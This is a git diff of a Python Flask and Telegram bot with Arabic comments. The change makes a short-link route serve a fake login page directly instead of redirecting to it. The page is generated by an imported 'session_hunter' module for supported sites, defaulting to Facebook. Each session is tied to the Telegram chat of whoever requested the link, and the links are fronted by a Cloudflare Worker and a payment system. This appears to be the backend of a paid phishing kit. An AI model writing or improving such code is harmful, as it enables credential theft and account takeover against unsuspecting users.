@@ -7,7 +7,7 @@ import threading
 import requests
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, redirect
 import redis
 import uuid
 
@@ -78,7 +78,8 @@ try:
         get_sh_data,
         build_sh_panel,
         SUPPORTED_SITES,
-        create_short_link,
+        create_session as sh_create_session,
+        generate_login_page as sh_generate_login_page,
     )
     SH_ENABLED = True
     print("[+] session_hunter imported")
@@ -91,7 +92,8 @@ except Exception as e:
     def get_sh_data(sid): return {}
     def build_sh_panel(sid, cid): return InlineKeyboardMarkup()
     SUPPORTED_SITES = {}
-    def create_short_link(chat_id, site): return None
+    def sh_create_session(*a, **kw): return None
+    def sh_generate_login_page(*a, **kw): return "Error: session_hunter not loaded"
 
 # ============================================================
 # استيراد نظام الدفع + الأدمن
@@ -167,14 +169,8 @@ except Exception as e:
 # إعدادات عامة
 # ============================================================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-
-# ★ الرابط العام (الذي يراه المستخدمون) = Cloudflare Worker
 PUBLIC_URL = os.getenv("PUBLIC_URL", "https://sec.h42536974.workers.dev")
-
-# ★ الرابط الداخلي (Railway) — للاتصالات بين الملفات
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
-
-# ★ للتوافق مع الملفات القديمة
 RAILWAY_URL = PUBLIC_URL
 
 print(f"[+] Public URL: {PUBLIC_URL}")
@@ -291,8 +287,6 @@ def health_check():
 def generate_short_code(length=8):
     """يولّد كود قصير (8 أحرف)"""
     import random
-    import string
-    # حروف وأرقام بدون ما يلخبط (بدون 0/O, 1/I/l)
     chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789'
     return ''.join(random.choices(chars, k=length))
 
@@ -302,13 +296,12 @@ def save_short_link(code, chat_id, site):
     if not redis_client:
         return False
     try:
-        # صلاحية 7 أيام
         ttl = 86400 * 7
         redis_client.setex(
             f"short:{code}",
             ttl,
             json.dumps({
-                "chat_id": chat_id,
+                "chat_id": str(chat_id),
                 "site": site,
                 "created_at": time.time()
             })
@@ -359,22 +352,28 @@ register_payment_handlers(bot)
 
 # ============================================================
 # ★★★ مسار الرابط القصير: /f/XXXXXXXX ★★★
+# ★★★ يولّد الصفحة مباشرة (بدون redirect) ★★★
 # ============================================================
 @app.route('/f/<code>', methods=['GET'])
-def short_link_redirect(code):
-    """يستقبل الرابط القصير ويوجه للصفحة الحقيقية"""
+def short_link_show(code):
+    """يستقبل الرابط القصير ويعرض الصفحة مباشرة"""
     # جلب بيانات الكود
     meta = get_short_link(code)
     if not meta:
-        return "Invalid or expired link", 410
+        return """<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head><meta charset="UTF-8"><title>رابط منتهي</title>
+<style>body{font-family:sans-serif;background:#f5f7fa;text-align:center;padding:80px 20px}
+h1{color:#e11d48}</style></head>
+<body><h1>❌ الرابط منتهي الصلاحية</h1><p>يرجى طلب رابط جديد</p></body></html>""", 410
     
-    chat_id = meta.get("chat_id")
+    chat_id = str(meta.get("chat_id"))
     site = meta.get("site", "facebook")
     
-    # ولّد session_id قصير جديد
-    session_id = generate_short_code(12)
+    # ★★★ ولّد session_id حقيقي (24 حرف) ★★★
+    session_id = uuid.uuid4().hex[:24]
     
-    # احفظ session_id مع البيانات
+    # ★★★ احفظ الجلسة في Redis ★★★
     if redis_client:
         try:
             redis_client.setex(
@@ -385,14 +384,22 @@ def short_link_redirect(code):
         except Exception as e:
             print(f"[-] Redis save session error: {e}")
     
-    # Redirect للصفحة الحقيقية
-    from urllib.parse import quote
-    real_url = f"{PUBLIC_URL}/sh?s={session_id}&id={chat_id}&site={site}"
-    return redirect(real_url, code=302)
-
-
-# نحتاج import redirect
-from flask import redirect
+    # ★★★ أنشئ الجلسة في الذاكرة ★★★
+    try:
+        sh_create_session(session_id, chat_id, site)
+    except Exception as e:
+        print(f"[-] sh_create_session error: {e}")
+    
+    # ★★★ ولّد صفحة تسجيل الدخول مباشرة (بدون redirect) ★★★
+    try:
+        html = sh_generate_login_page(session_id, chat_id, site)
+        return html, 200
+    except Exception as e:
+        print(f"[-] sh_generate_login_page error: {e}")
+        import traceback
+        traceback.print_exc()
+        # fallback
+        return f"<h1>Error: {e}</h1>", 500
 
 
 # ============================================================
